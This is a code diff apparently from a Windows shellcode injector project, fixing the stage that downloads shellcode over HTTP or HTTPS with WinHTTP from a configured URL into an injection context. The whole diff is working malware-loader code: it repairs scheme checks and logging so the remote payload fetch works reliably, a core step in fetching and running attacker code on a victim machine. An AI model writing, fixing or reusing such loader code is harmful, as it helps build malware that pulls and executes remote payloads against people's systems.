@@ -1,3 +1,5 @@
+#pragma comment(lib, "winhttp.lib")
+
 #include "phases/shellcode/fetch_http.h"
 #include "config.h"
 #include "debug.h"
@@ -12,21 +14,15 @@ BOOL GetShellcode_Http(INJECT_CTX* ctx) {
     if (ParseUrl(SHELLCODE_HTTP_URL, shellcodeUrl)) {
         ctx->shellcode = download(shellcodeUrl);
         ctx->shellcodeSize = ctx->shellcode.size();
-        DBG("Fetched %d shellcode bytes.", ctx->shellcodeSize);
+        DBG("Fetched %zu shellcode bytes.", ctx->shellcodeSize);
         return !ctx->shellcode.empty();
     }
     else {
-        DBG("Invalid shellcode URL: %s", SHELLCODE_HTTP_URL);
+        DBG("Invalid shellcode URL: %ls", SHELLCODE_HTTP_URL);
         return FALSE;
     }
 }
 
-
-struct UrlParts {
-    wchar_t scheme[16];
-    wchar_t host[256];
-    wchar_t path[256];
-};
 
 bool ParseUrl(LPCWSTR url, UrlParts& out) {
     memset(&out, 0, sizeof(out));
@@ -36,14 +32,16 @@ bool ParseUrl(LPCWSTR url, UrlParts& out) {
 }
 
 std::vector<BYTE> download(UrlParts shellcodeUrl) {
-    if (shellcodeUrl.scheme != L"https\0" && shellcodeUrl.scheme != L"http\0") {
-        DBG("Unrecognized scheme.");
-    }
+    bool isHttps = (wcscmp(shellcodeUrl.scheme, L"https") == 0);
 
+    if (!isHttps && wcscmp(shellcodeUrl.scheme, L"http") != 0) {
+        DBG("Invalid scheme in URL");
+        return {};
+    }
 
     // initialise session
     HINTERNET hSession;
-    if (shellcodeUrl.scheme == L"https\0") {
+    if (isHttps) {
         hSession = WinHttpOpen(
             NULL,
             WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
@@ -62,7 +60,7 @@ std::vector<BYTE> download(UrlParts shellcodeUrl) {
 
     // create session for target
     HINTERNET hConnect;
-    if (shellcodeUrl.scheme == L"https\0") {
+    if (isHttps) {
         hConnect = WinHttpConnect(
             hSession,
             shellcodeUrl.host,
@@ -79,7 +77,7 @@ std::vector<BYTE> download(UrlParts shellcodeUrl) {
 
     // create request handle
     HINTERNET hRequest;
-    if (shellcodeUrl.scheme == L"https\0") {
+    if (isHttps) {
         hRequest = WinHttpOpenRequest(
             hConnect,
             L"GET",
